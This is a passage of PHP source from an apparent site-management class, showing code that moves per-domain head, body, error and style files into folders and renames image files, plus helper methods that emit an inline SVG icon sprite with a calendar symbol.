			file_exists($folder.'/head_'.$this->domain_h.'.txt')) {
			$res = rename($folder.'/head_'.$this->domain_h.'.txt',
				$folder.'/'.$this->domain_h.'/head.txt');
			if ($res !== true) {
				$errors = true;
				print 'head file'."\n";
			}
		}
		if ( ! file_exists($folder.'/'.$this->domain_h.'/body.txt') &&
			file_exists($folder.'/body_'.$this->domain_h.'.txt')) {
			$res = rename($folder.'/body_'.$this->domain_h.'.txt',
				$folder.'/'.$this->domain_h.'/body.txt');
			if ($res !== true) {
				$errors = true;
				print 'body file'."\n";
			}
		}
		if ( ! file_exists($folder.'/'.$this->domain_h.'/errors.txt') &&
			file_exists($folder.'/errors_'.$this->domain_h.'.txt')) {
			$res = rename($folder.'/errors_'.$this->domain_h.'.txt',
				$folder.'/'.$this->domain_h.'/errors.txt');
			if ($res !== true) {
				$errors = true;
				print 'errors file'."\n";
			}
		}
		if ( ! file_exists($folder.'/'.$this->domain_h.'/style.css') &&
			file_exists($folder.'/style_'.$this->domain_h.'.css')) {
			$res = rename($folder.'/style_'.$this->domain_h.'.css',
				$folder.'/'.$this->domain_h.'/style.css');
			if ($res !== true) {
				$errors = true;
				print 'style file'."\n";
			}
		}

		if (($open = opendir($folder.'/img/'))) {
			$errors = false;
			while ($file = readdir($open)) {
				if (filetype($folder.'/img/'.$file) == 'link'
					|| $file == '.' || $file == '..'
					|| $file == '.th')
					continue;
				if (is_dir($folder.'/img/'.$file))
					continue;
				if ( ! is_file($folder.'/img/'.$file))
					continue;
				if (substr($file, strpos($file, '.')-2, 1) == '_')
					continue;
				$ext = substr($file, strpos($file, '.')-1);
				$name = substr($file, 0, strpos($file, '.')-1);
				$name = $name.'_'.$ext;
				$res = rename($folder.'/img/'.$file, $folder.'/img/'.$name);
				if ($res !== true) {
					$errors = true;
					print 'img file'."\n";
				}
			}
		}
		return $errors ? false : true;
	}

	function icon($n)
	{
		return '<svg class="sssmb_svgi sssmb_svgi_'.$n.'" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="#sssmb-svgi-'.$n.'" /></svg>';
	}

	function icons()
	{
		$p = "\n\n".'<svg class="sssmb_svgicons" style="width:0;height:0;overflow:hidden;display:none;"
		version="1.1"
		baseProfile="full"
		xmlns="http://www.w3.org/2000/svg"
		xmlns:xlink="http://www.w3.org/1999/xlink"
		xmlns:ev="http://www.w3.org/2001/xml-events"
	><defs>'."\n";

		$p .= '
	<symbol id="sssmb-svgi-calendar" viewBox="0 0 425 425">
		<path d="M293.333,45V20h-30v25H161.667V20h-30v25H0v360h316.213L425,296.213V45H293.333z M131.667,75v25h30V75h101.667v20h30V75 H395v50H30V75H131.667z M30,155h365v120H295v100H30V155z M373.787,305L325,353.787V305H373.787z"/><rect x="97.5" y="285" width="50" height="50"/><rect x="187.5" y="285" width="50" height="50"/><rect x="187.5" y="195" width="50" height="50"/><rect x="277.5" y="195" width="50" height="50"/><rect x="97.5" y="195" width="50" height="50"/>
	</symbol>
		';

		$p .= "\n".'</defs></svg>'."\n\n";
		return $p;
	}
}
//---------------------------------
